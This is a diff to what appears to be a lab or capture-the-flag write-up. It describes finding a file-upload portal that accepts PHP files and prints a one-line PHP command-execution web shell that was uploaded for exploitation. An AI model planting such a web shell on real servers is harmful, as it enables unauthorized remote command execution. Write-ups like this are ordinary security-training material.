@@ -91,3 +91,19 @@
         ===============================================================
 
  ![Screenshot 2024-07-20 153755](https://github.com/user-attachments/assets/296a3662-e68f-4edd-bd86-2c2c08f2e08d)
+ # Based on the Results:
+         So i Got a Idea that there is upload portal so it could be possibly a file upload based attack so
+         started to traverse the directory and i got a upload portal where i would upload not only image
+         but i can upload other files like .html,.php so as per the whatweb results the backend was Running
+         php so i uploaded a php file and i got everything listed in images/ directory
+![Screenshot at 2024-03-17 07-59-32](https://github.com/user-attachments/assets/15113a9d-a96b-4064-b7c8-34a3d37bc7f0)
+# Exploitation:
+
+        Uploading of a simple php command execution shell
+
+        # Code [Shell.php]:
+        
+        <?php echo "Shell";system($_GET['cmd']); ?>
+
+        # 
+        
